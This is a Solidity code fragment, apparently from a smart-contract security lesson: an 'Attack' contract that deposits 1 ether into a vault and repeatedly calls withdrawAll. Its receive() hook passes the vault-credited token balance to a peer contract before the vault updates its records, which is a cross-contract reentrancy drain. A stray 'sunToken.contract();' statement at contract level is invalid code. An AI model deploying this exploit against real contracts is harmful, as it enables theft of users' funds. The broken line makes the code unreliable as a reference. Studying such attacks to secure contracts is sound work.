contract Attack {

    // OTHER ATTACK FUNCTIONS ....

    receive() external payable {
        if (address(sunVault).balance >= 1 ether) {
            sunToken.transfer(
                address(attackPeer),
                sunVault.getUserBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        sunVault.deposit{value: 1 ether}();
        sunVault.withdrawAll();
    }

    function attackNext() external {
        sunVault.withdrawAll();
    }

    sunToken.contract();
    // OTHER ATTACK FUNCTIONS .....
} 
